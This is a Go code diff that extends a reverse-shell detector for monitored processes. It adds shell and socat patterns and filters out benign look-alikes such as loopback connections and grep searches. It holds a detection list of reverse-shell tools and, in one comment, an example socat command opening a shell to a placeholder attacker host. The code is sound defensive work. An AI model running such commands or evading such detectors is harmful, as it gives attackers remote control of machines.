@@ -284,6 +284,14 @@ func DetectReverseShells(processes []Process) []ProcessThreat {
 		{"dash -i", []string{"interactive shell"}, ReverseShellClassStrong},
 		{"ash -i", []string{"interactive shell"}, ReverseShellClassStrong},
 		{"fish -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"csh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"tcsh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"mksh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"oksh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"lksh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"posh -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"yash -i", []string{"interactive shell"}, ReverseShellClassStrong},
+		{"rbash -i", []string{"interactive shell"}, ReverseShellClassStrong},
 		{"/dev/tcp/", []string{"bash tcp redirect"}, ReverseShellClassStrong},
 		{"/dev/udp/", []string{"bash udp redirect"}, ReverseShellClassStrong},
 
@@ -308,6 +316,10 @@ func DetectReverseShells(processes []Process) []ProcessThreat {
 		// Socat reverse shells
 		{"socat", []string{"socat"}, ReverseShellClassStrong},
 		{"EXEC:", []string{"socat exec"}, ReverseShellClassStrong},
+		// SYSTEM: is socat's sh -c twin of EXEC:. Unlike EXEC: the bare token is
+		// too common elsewhere (kube-system:, log text), so it only counts on a
+		// socat command line — see reverseShellNeedsSocat.
+		{"SYSTEM:", []string{"socat system"}, ReverseShellClassStrong},
 
 		// PowerShell reverse shells (if Wine/mono present)
 		{"powershell", []string{"powershell"}, ReverseShellClassStrong},
@@ -348,6 +360,12 @@ func DetectReverseShells(processes []Process) []ProcessThreat {
 			// one-liners; the real attack forms still trip the self-sufficient
 			// patterns (EXEC:, System.Net.Sockets) regardless.
 			if reverseShellNeedsNetwork[p.pattern] && !networkRelated {
+				continue
+			}
+			if reverseShellNeedsSocat[p.pattern] && !containsAtTokenStart(cmdLower, "socat") {
+				continue
+			}
+			if refine, ok := reverseShellRefine[p.pattern]; ok && !refine(cmdLower) {
 				continue
 			}
 			// The network-indicator gate constrains ONLY the ambiguous
@@ -392,11 +410,29 @@ var reverseShellNeedsNetwork = map[string]bool{
 	"powershell": true,
 }
 
+// reverseShellNeedsSocat lists socat address keywords that are self-sufficient
+// evidence only on a socat command line. They fire regardless of a network
+// indicator, so `socat OPENSSL:attacker:443 SYSTEM:sh` (dotless host, decimal
+// or IPv6 address) is still caught — while `rg "exec:" src/` is not.
+var reverseShellNeedsSocat = map[string]bool{
+	"EXEC:":   true,
+	"SYSTEM:": true,
+}
+
+// reverseShellRefine narrows patterns whose literal text is also common in
+// benign commands: the pattern only counts when its predicate holds. Searching
+// for /dev/tcp/ (grep, rg) or loading IO::File must not kill the container.
+var reverseShellRefine = map[string]func(cmdLower string) bool{
+	"/dev/tcp/": devNetRedirectNonLoopback,
+	"/dev/udp/": devNetRedirectNonLoopback,
+	"perl -MIO": perlLoadsIOSocket,
+}
+
 // containsAtTokenStart reports whether pat occurs in s at the start of a token,
-// i.e. not glued to a preceding letter, digit, or underscore. Plain substring
-// matching flagged benign commands: `rsync -e ssh` contains "nc -e" and
-// `ssh -i key host` contains "sh -i". A path prefix still counts as a token
-// boundary, so `/usr/bin/nc -e` and `/bin/sh -i` keep matching.
+// i.e. not glued to a preceding letter, digit, underscore, '.' or '-'. Plain
+// substring matching flagged benign commands: `rsync -e ssh` contains "nc -e",
+// `ssh -i key host` and `./setup.sh -i` contain "sh -i". A path prefix still
+// counts as a token boundary, so `/usr/bin/nc -e` and `/bin/sh -i` keep matching.
 func containsAtTokenStart(s, pat string) bool {
 	for from := 0; ; {
 		i := strings.Index(s[from:], pat)
@@ -404,11 +440,17 @@ func containsAtTokenStart(s, pat string) bool {
 			return false
 		}
 		i += from
-		if i == 0 || !isWordByte(s[i-1]) {
+		if i == 0 || !isTokenGlue(s[i-1]) {
 			return true
 		}
 		from = i + 1
 	}
+}
+
+// isTokenGlue reports whether b, directly before a pattern, makes it part of a
+// longer token (a name like kube-sh or setup.sh) rather than its own word.
+func isTokenGlue(b byte) bool {
+	return isWordByte(b) || b == '.' || b == '-'
 }
 
 func isWordByte(b byte) bool {
@@ -428,12 +470,97 @@ var hostPortRe = regexp.MustCompile(`(?:\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9][a-z0-9-
 // one-liners (e.g. db.connect(), a PATH with ':') and re-open issue #842. Real
 // reverse shells in these interpreters always carry a socket/tcp/udp keyword,
 // an IP, or a host:port endpoint alongside any connect() call.
+//
+// "socket"/"fsockopen"/"sockaddr" rather than a bare "sock": the latter matched
+// docker.sock and $SSH_AUTH_SOCK in ordinary agent commands. Loopback
+// endpoints (an agent health-checking its own dev server at 127.0.0.1:8000)
+// and source locations (file.py:12) are not network indicators either.
 func isNetworkRelated(cmdLower string) bool {
-	return strings.Contains(cmdLower, "sock") || // socket, fsockopen, tcpsocket, ...
+	return strings.Contains(cmdLower, "socket") || // socket.socket, tcpsocket, IO::Socket, ...
+		strings.Contains(cmdLower, "fsockopen") ||
+		strings.Contains(cmdLower, "sockaddr") ||
 		strings.Contains(cmdLower, "tcp") ||
 		strings.Contains(cmdLower, "udp") ||
 		containsIPPattern(cmdLower) ||
-		hostPortRe.MatchString(cmdLower)
+		containsRemoteHostPort(cmdLower)
+}
+
+// sourceFileExts are extensions that make "name.ext:NN" a file:line reference
+// (compiler output, grep -n, stack traces) rather than a host:port endpoint.
+var sourceFileExts = map[string]bool{
+	"py": true, "js": true, "ts": true, "tsx": true, "jsx": true, "mjs": true,
+	"go": true, "rb": true, "rs": true, "sh": true, "c": true, "h": true,
+	"cc": true, "cpp": true, "hpp": true, "java": true, "kt": true, "php": true,
+	"pl": true, "md": true, "txt": true, "json": true, "yaml": true, "yml": true,
+	"toml": true, "lock": true, "log": true, "html": true, "css": true,
+	"sql": true, "cfg": true, "ini": true, "conf": true, "xml": true, "csv": true,
+}
+
+// containsRemoteHostPort reports whether cmdLower has a hostPortRe endpoint
+// that is neither loopback nor a file:line reference.
+func containsRemoteHostPort(cmdLower string) bool {
+	for _, m := range hostPortRe.FindAllString(cmdLower, -1) {
+		host := m[:strings.LastIndexByte(m, ':')]
+		if isLoopbackHost(host) {
+			continue
+		}
+		if dot := strings.LastIndexByte(host, '.'); dot >= 0 && sourceFileExts[host[dot+1:]] {
+			continue
+		}
+		return true
+	}
+	return false
+}
+
+// isLoopbackHost reports whether host names this machine. A connection there
+// can't reach an attacker, so it is not reverse-shell evidence.
+func isLoopbackHost(host string) bool {
+	return host == "localhost" || host == "0.0.0.0" || host == "::1" || host == "[::1]" ||
+		strings.HasPrefix(host, "127.")
+}
+
+// devNetRedirectNonLoopback reports whether cmdLower opens a bash /dev/tcp or
+// /dev/udp socket to a non-loopback host. The path only connects when it is a
+// redirection target (`>& /dev/tcp/h/p`, `<>/dev/tcp/...`, `< /dev/tcp/...`),
+// so a mere mention (`grep -rn /dev/tcp/ docs`) is skipped — as is a port
+// probe of the agent's own services (`</dev/tcp/localhost/5432`).
+func devNetRedirectNonLoopback(cmdLower string) bool {
+	for _, dev := range []string{"/dev/tcp/", "/dev/udp/"} {
+		for from := 0; ; {
+			i := strings.Index(cmdLower[from:], dev)
+			if i < 0 {
+				break
+			}
+			i += from
+			from = i + len(dev)
+
+			j := i - 1
+			for j >= 0 && (cmdLower[j] == ' ' || cmdLower[j] == '\t') {
+				j--
+			}
+			if j < 0 || !strings.ContainsRune("<>&", rune(cmdLower[j])) {
+				continue // not a redirection target
+			}
+			host := cmdLower[from:]
+			if k := strings.IndexByte(host, '/'); k >= 0 {
+				host = host[:k]
+			}
+			if !isLoopbackHost(host) {
+				return true
+			}
+		}
+	}
+	return false
+}
+
+// perlIOSocketRe matches perl loading the IO bundle (`-MIO`, which pulls in
+// IO::Socket) or IO::Socket itself — but not unrelated IO::* modules such as
+// IO::File or IO::Handle.
+var perlIOSocketRe = regexp.MustCompile(`(?:^|\s)-mio(?:::socket|\s|$)`)
+
+// perlLoadsIOSocket reports whether a perl command line loads IO::Socket via -M.
+func perlLoadsIOSocket(cmdLower string) bool {
+	return perlIOSocketRe.MatchString(cmdLower)
 }
 
 // containsIPPattern reports whether the command contains a whitespace-delimited
